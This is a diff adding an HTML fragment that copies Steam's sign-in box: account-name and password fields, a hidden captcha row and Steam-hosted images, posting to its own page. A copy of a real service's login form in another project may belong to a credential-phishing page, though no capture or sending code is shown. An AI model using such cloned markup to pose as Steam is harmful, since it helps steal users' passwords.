@@ -1,0 +1,50 @@
+
+		
+		<div class="checkout_content_box">
+			<div class="loginbox">
+				<div class="loginbox_left">
+					<div class="loginbox_content">
+						<h2>Sign in</h2>
+						<p>To an existing Steam account</p>
+						<br>
+						<form name="logon" action="" method="POST" id="login_form" style="display: block;">
+							<div class="login_row">
+								<div class="input_title">Steam account name</div>
+								<input class="text_input" type="text" name="username" id="input_username" value="">
+							</div>
+							<div class="login_row">
+								<div class="input_title">Password</div>
+								<input class="text_input" type="password" name="password" id="input_password" autocomplete="off">
+							</div>
+														<div class="login_row" id="captcha_entry" style="display: none;">
+								<div id="captcha_image_row">
+									<img style="float: left;" id="captchaImg" src="https://steamstore-a.akamaihd.net/public/images/blank.gif" width="206" height="40" border="0">
+									<div id="captchaRefresh">
+										<span class="linkspan" id="captchaRefreshLink">Refresh</span>
+									</div>
+									<div style="clear: left;"></div>
+								</div>
+								<br>
+								<div class="input_title">Enter the characters above</div>
+								<input class="text_input" id="input_captcha" type="text" name="captcha_text">
+							</div>
+							<div style="display: none;"><input type="submit"></div>
+						</form>
+
+						<noscript><p>Javascript must be enabled to use this site</p></noscript>
+						<script>
+							document.getElementById('login_form').style.display = 'block';
+						</script>
+					</div>
+
+					<div class="btn_ctn">
+						<div id="login_btn_signin">
+							<button type="submit" class="btnv6_blue_hoverfade  btn_medium">
+								<span>Sign in</span>
+							</button>
+						</div>
+						<div id="login_btn_wait" style="display: none;">
+							<img src="https://steamstore-a.akamaihd.net/public/images/login/throbber.gif">
+						</div>
+					</div>
+				</div>
